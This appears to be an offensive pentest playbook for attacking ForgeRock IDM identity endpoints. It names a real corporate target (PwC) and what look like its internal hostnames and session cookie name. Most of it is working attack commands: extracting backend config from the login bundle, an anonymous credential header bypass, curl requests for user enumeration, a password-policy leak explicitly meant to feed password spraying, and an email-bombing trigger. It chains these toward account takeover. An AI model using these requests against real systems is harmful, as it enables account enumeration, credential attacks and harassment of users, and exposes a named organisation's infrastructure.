# ForgeRock Identity Management (OpenIDM / PingIDM) — unauth surface via SPA config

Companion to `forgerock-openam-recon.md`. When an AM host's custom login SPA embeds its
backend config, the IDM layer behind it often exposes unauth endpoints that the AM layer
locks down. Session-validated (PwC identity.pwc.com, 2026-10): unauth **user enumeration**
on a central corporate identity store.

## Step 1 — Extract IDM config from the login SPA bundle

The login SPA (Angular, `main.<hash>.js` at e.g. `/login/main-es2015.<hash>.js` or
`/identity/main.<hash>.js`) embeds minified backend constants:

```bash
grep -aoE '(OPENIDM_HOST|OPENIDM_HOST_BULK|OPENAM_HOST|OPENAM_COOKIE|REMEMBER_ME_COOKIE)"?\s*[:=]\s*"[^"]*"' main.js
# → OPENIDM_HOST: "https://identity.example.com/openidm/"
# → OPENIDM_HOST_BULK: "https://idm01-prod-iam-eu.exampleINTERNAL.com:8443/openidm/"  ← internal prod host!
# → OPENAM_COOKIE: "pwcGlobalSSID"  ← global session cookie name
# → internal AD domain from AM serverinfo: .glblcloud.ad.exampleinternal.com
```

Then map every custom scripted endpoint the SPA calls:

```bash
grep -aoE 'OPENIDM_HOST\+"endpoint/[a-zA-Z0-9_/?=_-]+' main.js | sort -u
grep -aoE '\?(action|_action)=[a-zA-Z_]+' main.js | sort -u
```

## Step 2 — The anonymous credential unlock

ForgeRock IDM self-service endpoints accept the credential pair the SPA itself sends:

```
X-OpenIDM-Username: anonymous
X-OpenIDM-Password: anonymous
```

This converts 403/401 responses into 200s on the `openidm-reg` role's allowlist.

**Pitfall — header set matters (tested all three):**
- `X-OpenIDM-Username: anonymous` + `X-OpenIDM-Password: anonymous` → **WORKS** (200)
- `X-OpenIDM-DataStoreToken: anonymous` (alone) → 401 Access Denied
- `X-OpenIDM-NoSession` / `X-OpenIDM-OAuth-Login` (alone) → 401 Access Denied

## Step 3 — Validated unauth endpoints

```bash
I="https://identity.example.com/openidm"
AUTH='-H "X-OpenIDM-Username: anonymous" -H "X-OpenIDM-Password: anonymous"'

# Version + EOL mapping (unauth):
curl -sk "$I/info/version" $AUTH
# → {"productVersion":"6.5.0","productBuildDate":"20181128123548","productRevision":"7b41aaf"}
# 8-year-old build on the production identity plane = HIGH finding on its own.

# Identity context (anon's granted role + your source IP echoed back):
curl -sk "$I/info/login" $AUTH
# → roles: ["internal/role/openidm-reg"], authenticationId: "anonymous"

# USER ENUMERATION (the critical one):
curl -sk -X POST "$I/endpoint/<deployment-specific>?_action=validateAccount" $AUTH \
  -H "Content-Type: application/json" -d '{"mail":"first.last@example.com"}'
# → valid:   {"isValid":true,  "message":"The account is valid",     "validation_actions":1}
#   invalid: {"isValid":false,"message":"The account is not valid",  "validation_actions":0}

# PASSWORD POLICY leak (feeds spray dictionary):
curl -sk -X POST "$I/endpoint/pwcvalidate/?_action=validateObject" $AUTH \
  -H "Content-Type: application/json" \
  -d '{"userName":"a@b.c","sn":"A","givenName":"B","mail":"a@b.c","password":"x"}'
# → failedPolicyRequirements with MIN_LENGTH, THREE_OUT_OF_FOUR, full symbol charset

# Email trigger (potential bombing):
curl -sk "$I/endpoint/needhelp?mail=ANY@ADDR.com&appRedirectLink=https://example.com" $AUTH
# → "An email was sent to your email address" for BOTH real and nonexistent domains
```

### Endpoint taxonomy (names are deployment-specific — grep the SPA)

| Endpoint class | What it gives | Verified outcome |
|---|---|---|
| `validateAccount` / account-exists check | **user enumeration** | isValid true/false differential |
| `validateProperty` / `validateObject` | password-policy leak | full policy params |
| `needhelp` | email trigger | fires for any address |
| `createFederatedUser` / `submitRequirements` | registration | federated-domain gate + captcha (soft-fail `code:275`) |
| `pwcpwdreset?_action=validate_token` | reset-token gate | 401 "session expired" for garbage (locked) |
| `getManagedAccount`, `search`, `managed/*`, `system/*` | user data | 403 for anon (locked) |
| `selfservice/*` | profile flows | 403 (locked) |

## Validation discipline for user-enum claims

- Same valid probe repeated ≥3 times → consistently `isValid:true`
- ≥5 negative controls (random strings, wrong-domain, wrong-TLD) → all `false`
- Corporate `first.last@` naming hits ~30–40% on common Vietnamese/International names — verify with repeats before assuming false positive
- DO NOT mass-enumerate beyond proof-of-concept (10–15 probes) without explicit engagement scope. Central corporate identity = crown-jewel.

## Hardened negatives (record as covered)

- `managed/user?_queryId=*` → 403 Access Denied (correct)
- `/openidm/system/*` → 403
- `info/server`, `info/heap` → 404
- `validateRecaptcha` → server-side token validation enforced
- Self-registration often disabled (`selfRegistration: false` in AM serverinfo)

## Related
- `forgerock-openam-recon.md` (this umbrella) — AM layer: serverinfo realm-unmasking, OIDC scope/schema leak, SAML AuthnRequest decode
- `hunt-ato` / `hunt-brute-force` — downstream spray chains once accounts are enumerated
- `js-bundle-secret-hunting` / `extracting-api-schemas-from-spa-bundles` — the SPA-config extraction generalizes
